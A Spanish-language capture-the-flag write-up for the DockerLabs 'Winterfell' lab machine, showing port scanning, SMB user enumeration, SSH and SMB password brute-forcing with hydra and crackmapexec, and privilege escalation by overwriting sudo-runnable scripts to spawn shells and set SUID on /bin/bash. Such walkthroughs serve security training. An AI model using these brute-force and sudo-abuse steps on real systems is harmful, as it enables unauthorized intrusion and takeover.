# 🖥️ Writeup - Winterfell 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip winterfell.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh winterfell.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80,139,445 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 13:15 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000028s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 39:f8:44:51:19:1a:a9:78:c2:21:e6:19:d3:1e:41:96 (ECDSA)
|_  256 43:9b:ac:9c:d3:0c:ad:95:44:3a:c3:fb:9e:df:3e:a2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.61 ((Debian))
|_http-title: Juego de Tronos
|_http-server-header: Apache/2.4.61 (Debian)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-15T11:15:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.85 seconds
```

Accedemos por `HTTP` y nos encontramos con el siguiente mensaje:

```
Diario de Jon

Se acerca el invierno, y los caminantes blancos se aproximan al muro. 
Tengo que conseguir que Arya lleve el mensaje a Daenerys para que nos mande su apoyo y el de sus dragones.
```

Sabemos que `jon`, `arya` y `daenerys` son personajes de la serie Juego de Tronos, y que potencialmente podrían ser usuarios del sistema.

Como no estamos seguros de que realmente lo sean, utilizamos la herramienta `enum4linux` para intentar enumerar usuarios del sistema a través del puerto `445` (`SMB`).

```bash
enum4linux -a 172.17.0.2
```

Info:
```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\jon (Local User)
S-1-22-1-1001 Unix User\aria (Local User)
S-1-22-1-1002 Unix User\daenerys (Local User)
```
Encontramos 3 usuarios válidos en el sistema: `jon`, `aria` y `daenerys`.

# GOBUSTER

Realizamos un fuzzing de directorios para intentar localizar directorios o archivos ocultos.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              bak,sh,html,zip,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1729]
/dragon               (Status: 301) [Size: 309] [--> http://172.17.0.2/dragon/]
Progress: 482899 / 1543899 (31.28%)
```

Descubrimos un directorio llamado `/dragon` y, al acceder a él, encontramos un archivo con el siguiente mensaje:

```
Estos son todos los Episodios de la primera  temporada de Juego de tronos.
Tengo la barra espaciadora estropeada por lo que dejare los nombres sin espacios, perdonad las molestias

seacercaelinvierno
elcaminoreal
lordnieve
tullidosbastardosycosasrotas
elloboyelleon
unacoronadeoro
ganasomueres
porelladodelapunta
baelor
fuegoyhielo
```

Esto podría ser una lista de posibles contraseñas para los usuarios mencionados anteriormente. Guardamos el contenido en un archivo `pass.txt`.

# FUERZA BRUTA

A continuación, llevamos a cabo un ataque de fuerza bruta sobre el puerto `445` (`SMB`), utilizando los usuarios enumerados y el archivo `pass.txt`.

```bash
crackmapexec smb 172.17.0.2 -u jon -p pass.txt           
```

Info:
```
SMB         172.17.0.2      445    77D3C9827BF1     [*] Windows 6.1 Build 0 (name:77D3C9827BF1) (domain:77D3C9827BF1) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    77D3C9827BF1     [+] 77D3C9827BF1\jon:seacercaelinvierno
```

Obtenemos credenciales válidas para el usuario `jon` : `seacercaelinvierno`.

Procedemos a enumerar las shares con este mismo usuario.

```bash
crackmapexec smb 172.17.0.2 -u jon -p seacercaelinvierno --shares
```

Info:
```
SMB         172.17.0.2      445    77D3C9827BF1     [*] Windows 6.1 Build 0 (name:77D3C9827BF1) (domain:77D3C9827BF1) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    77D3C9827BF1     [+] 77D3C9827BF1\jon:seacercaelinvierno 
SMB         172.17.0.2      445    77D3C9827BF1     [+] Enumerated shares
SMB         172.17.0.2      445    77D3C9827BF1     Share           Permissions     Remark
SMB         172.17.0.2      445    77D3C9827BF1     -----           -----------     ------
SMB         172.17.0.2      445    77D3C9827BF1     print$          READ            Printer Drivers
SMB         172.17.0.2      445    77D3C9827BF1     shared          READ,WRITE      
SMB         172.17.0.2      445    77D3C9827BF1     IPC$                            IPC Service (Samba 4.17.12-Debian)
SMB         172.17.0.2      445    77D3C9827BF1     jon             READ            Home Directories
```

Tenemos permisos `READ`, `WRITE` sobre el recurso `shared`, así que accedemos usando `smbclient`.

```bash
smbclient \\\\172.17.0.2\\shared -U jon
```

Info:
```
Password for [WORKGROUP\jon]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 15 13:46:35 2025
  ..                                  D        0  Tue Jul 16 22:25:59 2024
  proteccion_del_reino                N      313  Tue Jul 16 22:26:00 2024

		98497780 blocks of size 1024. 66378808 blocks available
smb: \> get proteccion_del_reino 
getting file \proteccion_del_reino of size 313 as proteccion_del_reino (152.8 KiloBytes/sec) (average 152.8 KiloBytes/sec)
smb: \>
```

Dentro encontramos un archivo llamado `proteccion_del_reino`, que transferimos a la máquina atacante con el comando `get`.

Una vez en nuestra máquina, leemos el archivo:

```
Aria de ti depende que los caminantes blancos no consigan pasar el muro. 
Tienes que llevar a la reina Daenerys el mensaje, solo ella sabra interpretarlo. Se encuentra cifrado en un lenguaje antiguo y dificil de entender. 
Esta es mi contraseña, se encuentra cifrada en ese lenguaje y es -> aGlqb2RlbGFuaXN0ZXI=
```

La contraseña que contiene está codificada en `base64`, así que la decodificamos.

```bash
echo "aGlqb2RlbGFuaXN0ZXI=" | base64 -d
```

Info:
```
hijodelanister
```

Probamos si esta contraseña es válida para alguno de los tres usuarios a través del puerto `22` (`SSH`).


```bash
hydra -L users.txt -p hijodelanister ssh://172.17.0.2 -t 60
```

Info:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-15 13:57:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:3/p:1), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: jon   password: hijodelanister
```

Obtenemos credenciales válidas para el usuario `jon` : `hijodelanister`.

Accedemos por `SSH`.

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.

```bash 
sudo -l
```

Info:
```
Matching Defaults entries for jon on 77d3c9827bf1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jon may run the following commands on 77d3c9827bf1:
    (aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
```

Comprobamos que podemos ejecutar el script `.mensaje.py` con privilegios del usuario `aria`.

Para aprovechar este permiso, eliminamos el `script` original y creamos otro con el mismo nombre pero con nuestro propio código.

```
import os    
os.system("/bin/bash")
```

Lo guardamos y lo ejecutamos de la siguiente manera. 

```bash
sudo -u aria python3 /home/jon/.mensaje.py
```

Con esto pivotamos con éxito al usuario `aria`.

Una vez como `aria`, comprobamos permisos `sudo` y `SUID`.

```bash 
sudo -l
```

Info:
```
Matching Defaults entries for aria on 77d3c9827bf1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User aria may run the following commands on 77d3c9827bf1:
    (daenerys) NOPASSWD: /usr/bin/cat, /usr/bin/ls
```

Vemos que podemos ejecutar los binarios `cat` y `ls` con privilegios de daenerys.

Aprovechamos esta posibilidad para listar y leer los archivos del directorio `/home/daenerys`.

```bash
sudo -u daenerys ls /home/daenerys
```

Info:
```
mensajeParaJon
```

Encontramos un archivo.

```bash
sudo -u daenerys cat /home/daenerys/mensajeParaJon
```

Info:
```
Aria estare encantada de ayudar a Jon con la guerra en el norte, siempre y cuando despues Jon cumpla y me ayude a  recuperar el trono de hierro. 
Te dejo en este mensaje la contraseña de mi usuario por si necesitas llamar a uno de mis dragones desde tu ordenador.

!drakaris!
``` 

Probamos a autenticarnos como el usuario `daenerys` utilizando la contraseña `drakaris`.

```bash
su daenerys
```
 
Introducimos la contraseña y pivotamos con éxito a dicho usuario.

Una vez como `daenerys`, comprobamos permisos `sudo` y `SUID`.

```bash 
sudo -l
```

Info:
```
Matching Defaults entries for daenerys on 77d3c9827bf1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User daenerys may run the following commands on 77d3c9827bf1:
    (ALL) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

Comprobamos que podemos ejecutar el archivo `.shell.sh` con privilegios de `root`. Para explotarlo, modificamos el contenido del `script` y lo ejecutamos.

```bash
printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /home/daenerys/.secret/.shell.sh
```

```bash
sudo -u root /usr/bin/bash /home/daenerys/.secret/.shell.sh
```

Con ello, asignamos permisos `SUID` al binario `/bin/bash`, lo que nos permite escalar a `root` fácilmente con el siguiente comando:

```bash
/bin/bash -p
```
Info:
```
bash-5.2# whoami
root
bash-5.2#
```

Ya somos root!